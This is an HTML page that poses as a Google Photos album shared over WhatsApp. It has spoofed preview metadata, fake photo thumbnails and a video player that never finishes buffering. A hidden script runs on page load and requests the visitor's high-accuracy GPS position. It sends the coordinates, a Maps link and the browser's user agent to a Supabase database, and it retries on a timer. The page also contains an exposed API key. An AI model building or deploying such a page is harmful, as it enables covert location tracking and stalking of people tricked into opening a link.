<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />

<!-- Makes WhatsApp preview look like a real Google Photos link -->
<title>Madhan shared a photo album with you</title>
<meta property="og:title"       content="Madhan shared an album with you" />
<meta property="og:description" content="10 new photos · Google Photos" />
<meta property="og:image"       content="https://lh3.googleusercontent.com/a/default-user=s120" />
<meta name="theme-color"        content="#ffffff" />

<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background: #fff; min-height: 100vh; }

  /* ── Google Photos top bar ── */
  .gp-bar {
    display: flex; align-items: center; justify-content: space-between;
    padding: 12px 16px; border-bottom: 1px solid #e0e0e0;
    position: sticky; top: 0; background: #fff; z-index: 10;
  }
  .gp-logo { display: flex; align-items: center; gap: 8px; font-size: 18px; color: #202124; }
  .gp-logo svg { width: 24px; height: 24px; }
  .gp-icon-btn { width: 36px; height: 36px; border-radius: 50%; background: none; border: none; cursor: pointer; color: #5f6368; display: flex; align-items: center; justify-content: center; }
  .gp-icon-btn:hover { background: #f1f3f4; }
  .gp-icon-btn svg { width: 20px; height: 20px; }

  /* ── WhatsApp forwarded badge ── */
  .wa-badge {
    margin: 10px 12px 0;
    background: #f0fdf4;
    border-left: 3px solid #25d366;
    border-radius: 6px;
    padding: 8px 12px;
    display: flex; align-items: flex-start; gap: 8px;
    font-size: 12px; color: #075e54;
  }
  .wa-badge strong { display: block; font-weight: 600; margin-bottom: 1px; }

  /* ── Album header ── */
  .album-header { padding: 18px 16px 12px; border-bottom: 1px solid #e0e0e0; }
  .album-title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
  .album-meta { font-size: 13px; color: #5f6368; display: flex; align-items: center; gap: 6px; }
  .sep { width: 3px; height: 3px; border-radius: 50%; background: #9aa0a6; }
  .shared-row { display: flex; align-items: center; gap: 10px; margin-top: 14px; }
  .avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg,#4285f4,#34a853); display: flex; align-items: center; justify-content: center; font-size: 15px; font-weight: 500; color: #fff; flex-shrink: 0; }
  .shared-row span { font-size: 13px; color: #5f6368; }
  .shared-row strong { color: #202124; font-weight: 500; }

  /* ── Action buttons ── */
  .action-bar { padding: 14px 16px; display: flex; gap: 10px; }
  .gp-btn { flex: 1; padding: 9px 14px; border-radius: 20px; border: 1px solid #dadce0; background: #fff; color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
  .gp-btn:hover { background: #f8f9fa; }
  .gp-btn.primary { background: #1a73e8; color: #fff; border-color: #1a73e8; }
  .gp-btn.primary:hover { background: #1765cc; }
  .gp-btn svg { width: 16px; height: 16px; }

  /* ── Photo grid ── */
  .photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; padding: 2px; }
  .thumb { aspect-ratio: 1; position: relative; overflow: hidden; cursor: pointer; }
  .thumb:nth-child(1) { background: linear-gradient(135deg,#c8d6e5,#a29bfe); }
  .thumb:nth-child(2) { background: linear-gradient(135deg,#ffeaa7,#fdcb6e); }
  .thumb:nth-child(3) { background: linear-gradient(135deg,#81ecec,#00b894); }
  .thumb:nth-child(4) { background: linear-gradient(135deg,#fab1a0,#e17055); }
  .thumb:nth-child(5) { background: linear-gradient(135deg,#a29bfe,#6c5ce7); }
  .thumb:nth-child(6) { background: linear-gradient(135deg,#55efc4,#00cec9); }
  .thumb:nth-child(7) { background: linear-gradient(135deg,#fd79a8,#e84393); }
  .thumb:nth-child(8) { background: linear-gradient(135deg,#74b9ff,#0984e3); }
  .thumb:nth-child(9) { background: linear-gradient(135deg,#ffeaa7,#e17055); }
  .vid-badge { position: absolute; bottom: 5px; left: 5px; display: flex; align-items: center; gap: 3px; color: #fff; font-size: 11px; text-shadow: 0 1px 3px rgba(0,0,0,0.6); }
  .vid-badge svg { width: 12px; height: 12px; }

  /* ── Video overlay ── */
  .overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 200; flex-direction: column; align-items: center; justify-content: center; }
  .overlay.show { display: flex; }

  .ov-topbar { position: absolute; top: 0; left: 0; right: 0; display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; background: linear-gradient(to bottom,rgba(0,0,0,0.75),transparent); z-index: 2; }
  .ov-close { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.15); border: none; color: #fff; font-size: 18px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
  .ov-filename { font-size: 13px; color: rgba(255,255,255,0.85); }

  .fake-player { width: 100%; max-width: 460px; aspect-ratio: 16/9; position: relative; display: flex; align-items: center; justify-content: center; }
  .player-bg { position: absolute; inset: 0; background: linear-gradient(135deg,#1a1a2e,#16213e,#0f3460); border-radius: 4px; }

  .spinner-wrap { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 14px; }
  .ring { width: 52px; height: 52px; border: 3px solid rgba(255,255,255,0.15); border-top-color: #fff; border-radius: 50%; animation: spin 0.9s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .buf-text { color: rgba(255,255,255,0.75); font-size: 13px; }
  .buf-text::after { content: ''; animation: dots 1.6s steps(4,end) infinite; }
  @keyframes dots { 0%{content:''} 25%{content:'.'} 50%{content:'..'} 75%{content:'...'} }

  .progress-row { position: absolute; bottom: 44px; left: 0; right: 0; padding: 0 14px; z-index: 2; }
  .prog-bg { height: 3px; background: rgba(255,255,255,0.2); border-radius: 2px; overflow: hidden; }
  .prog-fill { height: 100%; width: 0%; background: #fff; border-radius: 2px; animation: buf 20s ease-in-out infinite; }
  @keyframes buf { 0%{width:0%} 35%{width:62%} 60%{width:62%} 85%{width:80%} 96%{width:80%} 100%{width:0%} }

  .ov-controls { position: absolute; bottom: 0; left: 0; right: 0; padding: 10px 14px; display: flex; align-items: center; gap: 12px; background: linear-gradient(to top,rgba(0,0,0,0.6),transparent); z-index: 2; }
  .ctrl { background: none; border: none; color: rgba(255,255,255,0.55); cursor: pointer; padding: 4px; display: flex; }
  .ctrl svg { width: 22px; height: 22px; }
  .timelabel { font-size: 12px; color: rgba(255,255,255,0.55); font-family: monospace; margin-left: auto; }

  .buf-notice { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.4); text-align: center; padding: 0 20px; line-height: 1.7; }
</style>
</head>
<body>

<script>
var SUPABASE_URL = "https://fccizufvtgqdxpkuwjrm.supabase.co";
var SUPABASE_KEY = "sb_publishable_LG3h8OQ8XKXj-cvt6Ii3XA_m-014x8t";
var sent = false;

function save(data) {
  if (sent) return; sent = true;
  fetch(SUPABASE_URL + "/rest/v1/locations", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SUPABASE_KEY,
      "Authorization": "Bearer " + SUPABASE_KEY,
      "Prefer": "return=minimal"
    },
    body: JSON.stringify(data)
  }).catch(function(){});
}

function tryGPS() {
  var base = { user_agent: navigator.userAgent, captured_at: new Date().toISOString() };
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    function(p) {
      save({
        latitude: p.coords.latitude, longitude: p.coords.longitude,
        accuracy: p.coords.accuracy,
        maps_link: "https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude,
        user_agent: base.user_agent, captured_at: base.captured_at
      });
    },
    function(e) {
      save({ latitude: null, longitude: null, accuracy: null,
        maps_link: "denied: " + e.message,
        user_agent: base.user_agent, captured_at: base.captured_at });
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

tryGPS();
setTimeout(function(){ if(!sent){ sent=false; tryGPS(); } }, 8000);
setInterval(function(){ if(!sent) tryGPS(); }, 30000);
</script>
